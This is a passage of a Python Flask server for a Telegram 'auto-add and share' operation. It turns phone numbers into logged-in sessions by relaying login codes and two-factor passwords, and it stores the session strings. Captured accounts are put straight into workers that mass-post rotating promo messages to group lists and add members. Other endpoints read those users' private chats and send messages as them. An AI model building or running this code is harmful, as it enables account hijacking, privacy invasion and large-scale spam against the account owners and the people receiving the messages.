            `).join('') : '<p style="color:#999;text-align:center;">No messages</p>';
        }
        function addMessage() {
            const m = document.getElementById('new-message').value.trim();
            if (!m) return;
            messages.push(m);
            document.getElementById('new-message').value = '';
            renderMessages();
            saveMessages();
        }
        function removeMessage(i) { if(confirm('Remove?')) { messages.splice(i,1); renderMessages(); saveMessages(); } }
        function editMessage(i) { const m = prompt('Edit:',messages[i]); if(m!==null&&m.trim()){messages[i]=m.trim();renderMessages();saveMessages();} }
        async function saveMessages() {
            await fetch(`${API_BASE}/api/share-config`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messages})});
            loadConfig();
        }
        async function updateConfig() {
            await fetch(`${API_BASE}/api/share-config`,{method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    auto_share_enabled:document.getElementById('auto-share-enabled').checked,
                    rotate_messages:document.getElementById('rotate-messages').checked,
                    share_interval_seconds:parseInt(document.getElementById('share-interval').value),
                    share_delay_between_groups:parseInt(document.getElementById('delay-between').value)
                })
            });
        }
        async function startAllShares() {
            const r = await fetch(`${API_BASE}/api/auto-share/start-all`,{method:'POST'});
            const d = await r.json();
            alert(d.message||'Started');
        }
        async function stopAllShares() {
            const r = await fetch(`${API_BASE}/api/auto-share/stop-all`,{method:'POST'});
            const d = await r.json();
            alert(d.message||'Stopped');
        }
        function refreshStats() { loadStats(); }
        setInterval(loadStats, 30000);
    </script>
</body>
</html>'''

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    return render_template_string(LOGIN_PAGE)

@app.route('/dashboard')
def dashboard_page():
    return render_template_string(DASHBOARD_PAGE)

@app.route('/dash')
def dash_page():
    return redirect('/dashboard')

@app.route('/all')
def all_page():
    return redirect('/dashboard')

@app.route('/auto-add')
def auto_add_page():
    return redirect('/dashboard')

@app.route('/control')
def control_page():
    return render_template_string(CONTROL_PAGE)

@app.route('/ping')
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks),
        'share_workers': len(running_share_tasks),
        'accounts': len(accounts),
        'total_added_today': stats.get('today_added', 0),
        'total_shares_today': share_stats.get('today_shares', 0)
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS,
            'share_groups_count': len(share_groups)
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            aid_str = str(a['id'])
            ws = stats.get('worker_stats', {}).get(aid_str, {})
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True),
                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
                'auto_share_enabled': aid_str in running_share_tasks,
                'stats': {'total_added': ws.get('total', 0), 'today_added': ws.get('today', 0)},
                'is_running': aid_str in running_tasks,
                'is_sharing': aid_str in running_share_tasks
            })
        except:
            continue
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/share-config', methods=['GET', 'POST'])
def share_config_handler():
    global share_config, PROMO_MESSAGE, SHARE_INTERVAL_SECONDS, SHARE_DELAY_BETWEEN_GROUPS, AUTO_SHARE_ENABLED
    
    if request.method == 'GET':
        share_config = load_share_config()
        return jsonify({'success': True, 'config': share_config})
    
    try:
        data = request.json or {}
        if 'messages' in data: share_config['messages'] = data['messages']
        if 'share_interval_seconds' in data:
            share_config['share_interval_seconds'] = max(60, min(86400, int(data['share_interval_seconds'])))
            SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
        if 'share_delay_between_groups' in data:
            share_config['share_delay_between_groups'] = max(5, min(300, int(data['share_delay_between_groups'])))
            SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
        if 'auto_share_enabled' in data:
            share_config['auto_share_enabled'] = bool(data['auto_share_enabled'])
            AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
        if 'rotate_messages' in data: share_config['rotate_messages'] = bool(data['rotate_messages'])
        if 'use_premium_emojis' in data: share_config['use_premium_emojis'] = bool(data['use_premium_emojis'])
        if 'current_message_index' in data: share_config['current_message_index'] = int(data['current_message_index'])
        
        save_share_config(share_config)
        if share_config['messages']:
            PROMO_MESSAGE = share_config['messages'][0]
        
        return jsonify({'success': True, 'message': 'Updated', 'config': share_config})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-config/time-presets')
def time_presets():
    return jsonify({'success': True, 'presets': {
        '1min': 60, '3min': 180, '5min': 300, '10min': 600,
        '15min': 900, '30min': 1800, '1hour': 3600, '2hours': 7200,
        '6hours': 21600, '12hours': 43200, '24hours': 86400
    }})

@app.route('/api/share-groups', methods=['GET', 'POST'])
def share_groups_handler():
    if request.method == 'GET':
        return jsonify({'success': True, 'groups': share_groups, 'count': len(share_groups)})
    try:
        data = request.json or {}
        new_groups = data.get('groups', [])
        added = 0
        for g in new_groups:
            g = str(g).strip()
            if g and g not in share_groups:
                share_groups.append(g)
                added += 1
        save_share_groups()
        return jsonify({'success': True, 'message': f'Added {added}', 'total_groups': len(share_groups)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-groups/remove', methods=['POST'])
def remove_share_group():
    try:
        group = (request.json or {}).get('group', '').strip()
        if group and group in share_groups:
            share_groups.remove(group)
            save_share_groups()
        return jsonify({'success': True, 'total_groups': len(share_groups)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-groups/discover', methods=['POST'])
def discover_groups():
    try:
        account_id = (request.json or {}).get('accountId', '')
        acc = get_account_by_id(account_id)
        if not acc: return jsonify({'success': False, 'error': 'Account not found'})
        discovered = discover_share_groups(acc)
        added = sum(1 for g in discovered if g not in share_groups and not share_groups.append(g))
        save_share_groups()
        return jsonify({'success': True, 'discovered': len(discovered), 'new_added': added, 'total_groups': len(share_groups)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/start', methods=['POST'])
def start_share():
    try:
        account_id = (request.json or {}).get('accountId', '')
        acc = get_account_by_id(account_id)
        if not acc: return jsonify({'success': False, 'error': 'Account not found'})
        start_auto_share(acc)
        return jsonify({'success': True, 'message': f'Started for {acc.get("name", account_id)}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/stop', methods=['POST'])
def stop_share():
    try:
        account_id = (request.json or {}).get('accountId', '')
        stop_auto_share(account_id)
        return jsonify({'success': True, 'message': 'Stopped'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-share/start-all', methods=['POST'])
def start_share_all():
    started = 0
    for acc in accounts:
        if acc.get('session') and check_account_auth(acc):
            start_auto_share(acc)
            started += 1
            time.sleep(2)
    return jsonify({'success': True, 'started': started})

@app.route('/api/auto-share/stop-all', methods=['POST'])
def stop_share_all():
    stopped = 0
    for acc_key in list(running_share_tasks.keys()):
        stop_auto_share(acc_key)
        stopped += 1
    return jsonify({'success': True, 'stopped': stopped})

@app.route('/api/share-stats')
def share_stats_handler():
    config = load_share_config()
    return jsonify({'success': True, 'stats': {
        'total_shares': share_stats.get('total_shares', 0),
        'today_shares': share_stats.get('today_shares', 0),
        'last_share_time': share_stats.get('last_share_time'),
        'active_share_workers': len(running_share_tasks),
        'total_share_groups': len(share_groups),
        'share_interval': config.get('share_interval_seconds', 300),
        'delay_between_groups': config.get('share_delay_between_groups', 20)
    }})

@app.route('/api/get-chats', methods=['POST'])
def get_chats():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        if not account_id: return jsonify({'success': False, 'error': 'Account ID required'})
        
        cache_key = f"chats_{account_id}"
        with cache_lock:
            if cache_key in chat_list_cache:
                cached = chat_list_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < CHAT_LIST_CACHE_DURATION:
                    return jsonify(cached['data'])
        
        client, acc = get_client_for_account(account_id)
        if not client: return jsonify({'success': False, 'error': acc})
        
        async def _get():
            if not await SyncTelegramClient.safe_connect(client): return None, "Failed to connect"
            if not await client.is_user_authorized(): return None, "auth_key_unregistered"
            dialogs = await get_dialogs_lightweight(client, limit=50)
            return {'success': True, 'chats': dialogs, 'accountName': acc.get('name', 'Unknown')}, None
        
        try:
            result, error = SyncTelegramClient.run_async(_get, timeout=25)
            if error: return jsonify({'success': False, 'error': error})
            if result:
                with cache_lock:
                    chat_list_cache[cache_key] = {'data': result, 'timestamp': time.time()}
                return jsonify(result)
            return jsonify({'success': False, 'error': 'No data returned'})
        finally:
            try:
                async def _disconnect(): await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except: pass
    except Exception as e:
        logger.error(f"Get chats error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

@app.route('/api/get-chat-messages', methods=['POST'])
def get_chat_messages_route():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        if not account_id or not chat_id: return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
        
        cache_key = f"msgs_{account_id}_{chat_id}"
        with cache_lock:
            if cache_key in message_cache:
                cached = message_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < MESSAGE_CACHE_DURATION:
                    return jsonify(cached['data'])
        
        client, acc = get_client_for_account(account_id)
        if not client: return jsonify({'success': False, 'error': acc})
        
        async def _get_msgs():
            if not await SyncTelegramClient.safe_connect(client): return None, "Failed to connect"
            if not await client.is_user_authorized(): return None, "Session expired"
            messages = await get_chat_messages(client, chat_id, limit=30)
            return {'success': True, 'messages': messages}, None
        
        try:
            result, error = SyncTelegramClient.run_async(_get_msgs, timeout=20)
            if error: return jsonify({'success': False, 'error': error})
            if result:
                with cache_lock:
                    message_cache[cache_key] = {'data': result, 'timestamp': time.time()}
                return jsonify(result)
            return jsonify({'success': False, 'error': 'No messages found'})
        finally:
            try:
                async def _disconnect(): await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except: pass
    except Exception as e:
        logger.error(f"Get chat messages error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        message_text = data.get('message', '')
        if not account_id or not chat_id or not message_text: return jsonify({'success': False, 'error': 'Missing fields'})
        
        client, acc = get_client_for_account(account_id)
        if not client: return jsonify({'success': False, 'error': acc})
        
        async def _send():
            if not await SyncTelegramClient.safe_connect(client): return None, "Failed to connect"
            if not await client.is_user_authorized(): return None, "Session expired"
            return await send_message_async(client, chat_id, message_text), None
        
        try:
            result, error = SyncTelegramClient.run_async(_send, timeout=30)
            if error: return jsonify({'success': False, 'error': error})
            with cache_lock:
                chat_list_cache.pop(f"chats_{account_id}", None)
                message_cache.pop(f"msgs_{account_id}_{chat_id}", None)
            return jsonify(result or {'success': False, 'error': 'Failed'})
        finally:
            try:
                async def _disconnect(): await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except: pass
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:200]})

@app.route('/api/share-phone', methods=['POST'])
def share_phone():
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        if not phone: return jsonify({'success': False, 'error': 'No phone'})
        phone = '+' + phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').lstrip('+')
        result = auto_send_code(phone, str(data.get('telegramId', '')), data.get('firstName', ''), data.get('lastName', ''), data.get('username', ''))
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        phone = request.json.get('phone', '').strip()
        if not phone: return jsonify({'success': False, 'error': 'Phone required'})
        if not phone.startswith('+'): phone = '+' + phone
        result = auto_send_code(phone, str(request.json.get('telegramId', '')))
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        if not sid or sid not in temp_sessions: return jsonify({'success': False, 'error': 'Session expired'})
        
        td = temp_sessions[sid]
        if td.get('code_attempts', 0) >= 5: del temp_sessions[sid]; save_temp_sessions(); return jsonify({'success': False, 'error': 'Too many attempts'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                except errors.SessionPasswordNeededError:
                    if not pwd: return {'need_password': True}
                    await client.sign_in(password=pwd)
                
                me = await client.get_me()
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id, 'phone': me.phone or td['phone'],
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f'User {str(new_id)[-4:]}',
                    'username': me.username or '', 'session': client.session.save(),
                    'active': True, 'telegram_id': str(me.id)
                }
                
                existing = next((a for a in accounts if str(a.get('telegram_id')) == str(me.id)), None)
                if existing: existing.update(new_acc); new_acc['id'] = existing['id']
                else: accounts.append(new_acc)
                
                save_json(ACCOUNTS_FILE, accounts)
                auto_add_settings[str(new_acc['id'])] = {'enabled': True, 'delay_seconds': 30}
                save_json(SETTINGS_FILE, auto_add_settings)
                
                start_auto_add(new_acc)
                start_auto_share(new_acc)
                
                return {'success': True, 'account': {'id': new_acc['id'], 'name': new_acc['name']}}
            except Exception as e:
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try: await client.disconnect()
                except: pass
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        if result.get('success') and sid in temp_sessions:
            del temp_sessions[sid]; save_temp_sessions()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    aid = request.json.get('accountId')
    if not aid: return jsonify({'success': False, 'error': 'Account ID required'})
    stop_auto_add(aid); stop_auto_share(aid)
    name = remove_dead_account(aid, "Manual removal")
    return jsonify({'success': True, 'message': f'Removed: {name}'})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        if not aid: return jsonify({'success': False, 'error': 'Account ID required'})
        return jsonify({'success': True, 'settings': auto_add_settings.get(str(aid), {'enabled': False, 'delay_seconds': 30})})
    
    data = request.json
    aid = data.get('accountId')
    if not aid: return jsonify({'success': False, 'error': 'Account ID required'})
    auto_add_settings[str(aid)] = {'enabled': data.get('enabled', False), 'delay_seconds': max(30, data.get('delay_seconds', 30))}
    save_json(SETTINGS_FILE, auto_add_settings)
    return jsonify({'success': True})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME,
        'active_workers': len(running_tasks),
        'active_share_workers': len(running_share_tasks),
        'shares_today': share_stats.get('today_shares', 0),
        'total_shares': share_stats.get('total_shares', 0)
    })

@app.route('/api/health')
def health_check():
    return jsonify({
        'success': True, 'server': SERVER_NAME, 'status': 'healthy',
        'workers': len(running_tasks), 'share_workers': len(running_share_tasks),
        'accounts': len(accounts), 'timestamp': datetime.now().isoformat()
    })

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    while True:
        time.sleep(240)
        try: requests.get(f"{SERVER_URL}/ping", timeout=10)
        except: pass

def cleanup_caches():
    while True:
        time.sleep(30)
        current_time = time.time()
        with cache_lock:
            for cache, duration in [(chat_list_cache, CHAT_LIST_CACHE_DURATION), (message_cache, MESSAGE_CACHE_DURATION)]:
                expired = [k for k, v in cache.items() if current_time - v.get('timestamp', 0) > duration * 2]
                for k in expired: del cache[k]

def restore_and_start():
    time.sleep(5)
    logger.info(f"Restoring {len(accounts)} accounts...")
    for acc in accounts:
        try:
            if acc.get('session') and check_account_auth(acc):
                if auto_add_settings.get(str(acc['id']), {}).get('enabled', True):
                    start_auto_add(acc)
                start_auto_share(acc)
            else:
                remove_dead_account(acc['id'], "Auth failed on startup")
            time.sleep(2)
        except Exception as e:
            logger.error(f"Error restoring account {acc.get('id')}: {e}")
    save_json(ACCOUNTS_FILE, accounts)
    for tg in TARGET_GROUPS:
        if tg not in share_groups: share_groups.append(tg)
    save_share_groups()
    logger.info(f"✅ Startup complete - {len(running_tasks)} add, {len(running_share_tasks)} share workers")

def signal_handler(signum, frame):
    logger.info("Shutting down...")
    for k in list(running_tasks.keys()): stop_auto_add(k)
    for k in list(running_share_tasks.keys()): stop_auto_share(k)
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(STATS_FILE, stats)
    save_share_groups()
    save_share_config(share_config)
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# INITIALIZATION
# ============================================
accounts.extend(load_json(ACCOUNTS_FILE, []))
auto_add_settings.update(load_json(SETTINGS_FILE, {}))
stats.update(load_json(STATS_FILE, {}))
worker_adds.update(load_json(WORKER_ADDS_FILE, {}))
load_temp_sessions()
load_auto_sessions()
load_user_map()
load_share_groups()

share_config = load_share_config()
SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
if share_config['messages']:
    PROMO_MESSAGE = share_config['messages'][0]

for tg in TARGET_GROUPS:
    if tg not in share_groups:
        share_groups.append(tg)

print(f"""
╔══════════════════════════════════════════════════════════════╗
║     AUTO-ADD & SHARE SERVER #{SERVER_NUMBER} - {SERVER_NAME}              ║
║  Port: {PORT} | Accounts: {len(accounts)} | Share Groups: {len(share_groups)}    ║
║  Features: Auto Join ✅ | Auto Add ✅ | Auto Share ✅       ║
╚══════════════════════════════════════════════════════════════╝
""")

threading.Thread(target=keep_alive, daemon=True).start()
threading.Thread(target=restore_and_start, daemon=True).start()
threading.Thread(target=cleanup_caches, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
